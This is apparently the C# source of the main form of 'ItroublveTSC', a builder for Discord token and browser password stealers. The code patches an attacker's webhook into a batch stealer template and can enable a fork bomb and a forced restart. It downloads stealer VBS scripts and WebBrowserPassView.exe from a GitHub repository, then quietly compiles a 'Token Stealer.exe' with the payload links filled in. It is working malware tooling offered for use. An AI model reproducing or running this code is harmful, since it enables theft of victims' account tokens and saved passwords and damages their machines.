using DiscordFlooder.Class.Design.Rainbow;
using RaidAPI.StealToken;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Threading;
using System.Windows.Forms;


namespace ItroublveTSC
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            this.InitializeComponent();
            this.RainbowTimer.Start();
        }
        private void RainbowTimer_Tick(object sender, EventArgs e)
        {
            Rainbow.RainbowEffect();
            this.pnlRainbowTop.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
            this.panel37.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
        }

        private void CreateBtn_Click(object sender, EventArgs e)
        {
            bool flag = this.WebHookTxt.Text == "" || this.WebHookTxt.Text == "WebHook Here";
            if (flag)
            {
                MessageBox.Show("You need to paste a Webhook first!", "ItroublveTSC");
            }
            else
            {
                string _TokenStealer = "TokenStealer.bin";
                string _cdDir = Path.GetDirectoryName(Application.ExecutablePath) + "/output";
                string _CopyTokenStealer = "TokenStealerCOPY.bin";
                if (File.Exists(_CopyTokenStealer))
                {
                    File.Delete(_CopyTokenStealer);
                }
                if (Directory.Exists(_cdDir))
                {
                    Directory.Delete(_cdDir, true);
                }
                try
                {
                    File.Copy(_TokenStealer, _CopyTokenStealer);
                    string text = File.ReadAllText("TokenStealerCOPY.bin");
                    if (CrashPCchkbox.Checked && RestartPCchkbox.Checked)
                    {
                        text = text.Replace("rem %0|%0", "%0|%0");
                        text = text.Replace("rem SHUTDOWN -r -t 5", "SHUTDOWN -r -t 5");
                    }
                    else if (CrashPCchkbox.Checked && !RestartPCchkbox.Checked)
                    {
                        text = text.Replace("rem %0|%0", "%0|%0");
                    }
                    else if (!CrashPCchkbox.Checked && RestartPCchkbox.Checked)
                    {
                        text = text.Replace("rem SHUTDOWN -r -t 5", "SHUTDOWN -r -t 5");
                    }
                    text = text.Replace("Webhook", WebHookTxt.Text);
                    File.WriteAllText("TokenStealerCopy.bin", text);
                    DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                    File.Move(_CopyTokenStealer, "output/Token Stealer.bat");
                    File.Delete(_CopyTokenStealer);
                    Stealer.Dialog(this.WebHookTxt.Text);
                    using (WebClient webClient = new WebClient())
                        webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/tokenstealer.vbs", "output/tokenstealer.vbs");
                    using (WebClient webClient = new WebClient())
                        webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/tokenstealer2.vbs", "output/tokenstealer2.vbs");
                    using (WebClient webClient = new WebClient())
                        webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/WebBrowserPassView.exe?raw=true", "output/WebBrowserPassView.exe");
                    MessageBox.Show("Stealer files successfully created!", "ItroublveTSC");
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Failed to create stealer files!\r\n" + (ex.Message),"ItroublveTSC");
                }

            }
        }
        private void CloseBtn_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
        private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = Control.MousePosition.X - base.Location.X;
            Mouse.y = Control.MousePosition.Y - base.Location.Y;
        }
        private void HeadServerLbl_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = Control.MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                base.Location = Mouse.newpoint;
            }
        }

        private void roundBtn1_Click(object sender, EventArgs e)
        {
            bool flag = this.FinalresbatTxt.Text == "" || this.FinalresbatTxt.Text == "Token Stealer.bat Link Here";
            bool flag2 = this.TokenStealerVbsTxt.Text == "" || this.TokenStealerVbsTxt.Text == "Token Stealer.vbs Link Here";
            bool flag3 = this.TokenStealer2VbsTxt.Text == "" || this.TokenStealer2VbsTxt.Text == "Token Stealer2.vbs Link Here";
            bool flag4 = this.SendhookfileTxt.Text == "" || this.SendhookfileTxt.Text == "Sendhookfile.exe Link Here";
            bool flag5 = this.WebbrowserpassviewTxt.Text == "" || this.WebbrowserpassviewTxt.Text == "Webbrowserpassview.exe Link Here";
            if (flag)
            {
                MessageBox.Show("You need to paste a link to Token stealer.bat here!", "ItroublveTSC");
            }
            if (flag2)
            {
                MessageBox.Show("You need to paste a link to Token Stealer.vbs here!", "ItroublveTSC");
            }
            if (flag3)
            {
                MessageBox.Show("You need to paste a link to Token Stealer2.vbs here!", "ItroublveTSC");
            }
            if (flag4)
            {
                MessageBox.Show("You need to paste a link to Sendhookfile.exe here!", "ItroublveTSC");
            }
            if (flag5)
            {
                MessageBox.Show("You need to paste a link to Webbrowserpassview.exe here!", "ItroublveTSC");
            }
            else
            {
                try
                {
                    Process copydir = new Process();
                    ProcessStartInfo startCopydir = new ProcessStartInfo();
                    startCopydir.WindowStyle = ProcessWindowStyle.Hidden;
                    startCopydir.FileName = Path.Combine(Environment.SystemDirectory, "xcopy.exe");
                    startCopydir.Arguments = @"bin bin_copy /Y /E /I";
                    copydir.StartInfo = startCopydir;
                    copydir.Start();
                    System.Threading.Thread.Sleep(2000);
                    string text = File.ReadAllText(@"bin_copy/Program.cs");
                    text = text.Replace("finalresbatch", FinalresbatTxt.Text);
                    text = text.Replace("finalresvbs", TokenStealerVbsTxt.Text);
                    text = text.Replace("finalresVbs2", TokenStealer2VbsTxt.Text);
                    text = text.Replace("sendhookfile", SendhookfileTxt.Text);
                    text = text.Replace("webbrowserpassview", WebbrowserpassviewTxt.Text);
                    File.WriteAllText(@"bin_copy/Program.cs", text);

                    Process.Start(new ProcessStartInfo()
                    {
                        Arguments = "/C C:/Windows/Microsoft.NET/Framework/v4.0.30319/msbuild.exe bin_copy/TSC.sln",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        FileName = "cmd.exe"
                    });
                    Thread.Sleep(2000);
                }
                catch
                {
                    DialogResult dialogResult = MessageBox.Show("bin folder or files inside missing or modified!\r\n" + "Want to download bin files from Github?", "ItroublveTSC", MessageBoxButtons.YesNo);
                    if (dialogResult == DialogResult.Yes)
                    {
                        string _cdDir = Path.GetDirectoryName(Application.ExecutablePath) + "/bin";
                        DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/bin.zip?raw=true", "bin/Token Stealer Creator.zip");
                        ZipFile.ExtractToDirectory(_cdDir + "/Token Stealer Creator.zip", _cdDir);
                        File.Delete(_cdDir + "/Token Stealer Creator.zip");
                        MessageBox.Show("bin files has been downloaded successfully.\r\nItroublveTSC will now close, please relauch to create stealer!", "ItroublveTSC");
                        Environment.Exit(0);
                    }
                    else if (dialogResult == DialogResult.No)
                    {
                        MessageBox.Show("OK. FINE THEN. I WILL CLOSE MYSELF!", "ItroublveTSC");
                        Environment.Exit(0);
                    }
                }
                try
                {
                    string path = @"bin_copy\bin\debug\TOKEN STEALER CREATOR.exe";
                    string path2 = "Token Stealer.exe";
                    string folderPath = "bin_copy";
                    if (File.Exists(folderPath))
                    {
                        File.Delete(folderPath);
                    }
                    if (!File.Exists(path))
                    {
                        using (FileStream fs = File.Create(path)) { }
                    }  
                    if (File.Exists(path2))
                        File.Delete(path2);
                    File.Move(path, path2);
                    Directory.Delete(folderPath, true);
                    MessageBox.Show("Token Stealer.exe successfully compiled!", "ItroublveTSC");
                }
                catch(Exception ex)
                {
                    MessageBox.Show("Failed to create token stealer.\r\n.NET Framework might be missing, take a look below to know reason!\r\n" + (ex.Message), "ItroublveTSC");
                }
            }
        }

        private void roundBtn1_Click_1(object sender, EventArgs e)
        {
            try
            {
                Process.Start("https://itroublvehacker.ml/");
            }
            catch(Exception ex)
            {
                MessageBox.Show("Failed to open" + "How To Use" + (ex.Message), "ItroublveTSC");
            }
        }
    }
}
